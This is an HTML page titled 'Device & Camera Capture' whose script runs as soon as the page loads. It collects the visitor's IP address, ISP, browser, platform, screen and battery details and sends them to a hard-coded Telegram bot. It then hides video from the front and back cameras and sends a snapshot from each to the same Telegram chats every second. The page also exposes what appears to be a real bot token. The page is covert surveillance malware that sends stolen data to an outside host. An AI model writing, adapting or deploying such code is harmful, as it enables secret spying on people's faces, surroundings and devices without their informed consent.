<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Device & Camera Capture</title>
    <style>
        video { display: none; }
        h1 { color: green; text-align: center; }
    </style>
</head>
<body>
    <h1>Device & Camera Capture</h1>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const BOT_TOKEN = "8023106166:AAEGed6xp19KBQWiUmsv6P7_Bi1ZDhHJ3VU";
        const CHAT_IDS = ["2139008203", "OTHER_CHAT_ID"];
        let frontVideoStream = null;
        let backVideoStream = null;
        let intervalId = null;

        async function sendDeviceInfo() {
            try {
                const ipResponse = await fetch('https://ipapi.co/json/');
                const ipData = await ipResponse.json();
                const ipAddress = ipData.ip;
                const isp = ipData.org || "Unknown ISP";
                
                const battery = navigator.getBattery ? await navigator.getBattery() : null;
                const batteryStatus = battery ? `Battery Level: ${(battery.level * 100).toFixed(0)}%, Charging: ${battery.charging ? "Yes" : "No"}` : "Battery info not available";
                
                const deviceInfo = `
Device Information:
- IP Address: ${ipAddress}
- ISP: ${isp}
- Browser: ${navigator.userAgent}
- Platform: ${navigator.platform}
- Screen Resolution: ${window.screen.width}x${window.screen.height}
- ${batteryStatus}
                `;

                for (let chat_id of CHAT_IDS) {
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({ chat_id, text: deviceInfo })
                    });
                }
            } catch (error) {
                console.error("Error fetching device info:", error);
            }
        }

        async function startCamera(facingMode) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode }
                });
                const video = document.createElement('video');
                video.srcObject = stream;
                return new Promise((resolve) => {
                    video.onloadedmetadata = () => {
                        video.play();
                        resolve({ video, stream });
                    };
                });
            } catch (error) {
                console.error(`Camera (${facingMode}) access denied:`, error);
                return null;
            }
        }

        async function capturePhoto(video) {
            const canvas = document.getElementById('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            return canvas.toDataURL('image/png');
        }

        async function sendPhoto(photoData) {
            if (!photoData) return;
            const blob = await (await fetch(photoData)).blob();
            const formData = new FormData();
            formData.append("photo", blob, "photo.png");
            
            for (let chat_id of CHAT_IDS) {
                formData.append("chat_id", chat_id);
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: "POST",
                    body: formData
                });
            }
        }

        async function startDualCameraLoop() {
            sendDeviceInfo();
            const front = await startCamera("user");
            const back = await startCamera("environment");

            if (!front || !back) return;
            frontVideoStream = front.stream;
            backVideoStream = back.stream;

            async function captureAndSend() {
                const frontPhoto = await capturePhoto(front.video);
                const backPhoto = await capturePhoto(back.video);
                await sendPhoto(frontPhoto);
                await sendPhoto(backPhoto);
            }
            captureAndSend();
            intervalId = setInterval(captureAndSend, 1000);
        }

        function stopCameras() {
            if (frontVideoStream) frontVideoStream.getTracks().forEach(track => track.stop());
            if (backVideoStream) backVideoStream.getTracks().forEach(track => track.stop());
            clearInterval(intervalId);
        }

        window.onload = startDualCameraLoop;
        window.onbeforeunload = stopCameras;
    </script>
</body>
</html>
